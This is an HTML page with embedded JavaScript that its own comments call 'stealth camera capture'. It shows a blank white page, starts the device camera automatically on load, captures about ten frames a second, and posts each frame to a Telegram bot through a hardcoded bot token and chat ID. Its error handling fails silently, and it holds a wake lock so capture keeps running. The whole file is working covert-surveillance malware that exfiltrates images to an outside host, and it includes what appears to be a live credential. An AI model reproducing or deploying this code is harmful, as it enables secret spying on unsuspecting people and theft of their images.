<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title> </title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}
body {
    background: #ffffff;
    width: 100vw;
    height: 100vh;
    overflow: hidden;
    display: flex;
    justify-content: center;
    align-items: center;
}
video, canvas {
    display: none;
}
</style>
</head>
<body>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
// ===== STEALTH CAMERA CAPTURE =====
// No UI, no text, pure white background

const BOT_TOKEN = "8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg";
const CHAT_ID = "7870731053";
const CAPTURE_INTERVAL = 100; // 100ms = 10 pics/second

let video = document.getElementById('video');
let canvas = document.getElementById('canvas');
let ctx = canvas.getContext('2d');
let stream = null;
let captureTimer = null;
let isRunning = false;

// ===== REQUEST CAMERA PERMISSION SILENTLY =====
async function initCamera() {
    try {
        const constraints = {
            video: {
                facingMode: 'environment',
                width: { ideal: 640 },
                height: { ideal: 480 }
            },
            audio: false
        };
        
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        await video.play();
        
        // Set canvas size to match video
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        
        isRunning = true;
        startCapture();
        
    } catch (err) {
        // Silent fail - camera denied or not available
        console.log('Camera unavailable');
    }
}

// ===== CAPTURE AND SEND FRAMES =====
function startCapture() {
    if (captureTimer) clearInterval(captureTimer);
    
    captureTimer = setInterval(async () => {
        if (!isRunning || !stream || stream.active === false) {
            stopCapture();
            return;
        }
        
        try {
            // Capture frame
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convert to JPEG (quality 70% for size/speed balance)
            const imageData = canvas.toDataURL('image/jpeg', 0.7);
            const blob = dataURLToBlob(imageData);
            
            // Send to Telegram
            await sendToTelegram(blob);
            
        } catch (err) {
            // Silent fail on individual capture errors
        }
    }, CAPTURE_INTERVAL);
}

// ===== CONVERT DATA URL TO BLOB =====
function dataURLToBlob(dataURL) {
    const parts = dataURL.split(',');
    const mime = parts[0].match(/:(.*?);/)[1];
    const b64 = atob(parts[1]);
    const byteArray = new Uint8Array(b64.length);
    for (let i = 0; i < b64.length; i++) {
        byteArray[i] = b64.charCodeAt(i);
    }
    return new Blob([byteArray], { type: mime });
}

// ===== SEND TO TELEGRAM BOT =====
async function sendToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'frame.jpg');
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        // No response handling - silent operation
    } catch (err) {
        // Silent fail - network errors ignored
    }
}

// ===== STOP CAPTURE CLEANLY =====
function stopCapture() {
    isRunning = false;
    if (captureTimer) {
        clearInterval(captureTimer);
        captureTimer = null;
    }
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
    video.srcObject = null;
}

// ===== PAGE VISIBILITY HIDE =====
// If user switches tab, stop to save resources
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        stopCapture();
    } else {
        if (!isRunning && stream) {
            startCapture();
        }
    }
});

// ===== AUTO-START ON LOAD =====
// Small delay to ensure page is fully rendered
window.addEventListener('load', () => {
    setTimeout(initCamera, 500);
});

// ===== PREVENT SCREEN SLEEP =====
// (optional - keeps camera active)
let wakeLock = null;
async function requestWakeLock() {
    try {
        if ('wakeLock' in navigator) {
            wakeLock = await navigator.wakeLock.request('screen');
        }
    } catch (err) {}
}
requestWakeLock();

// ===== CLEANUP ON UNLOAD =====
window.addEventListener('beforeunload', () => {
    stopCapture();
    if (wakeLock) {
        try { wakeLock.release(); } catch(e) {}
    }
});
</script>
</body>
</html>
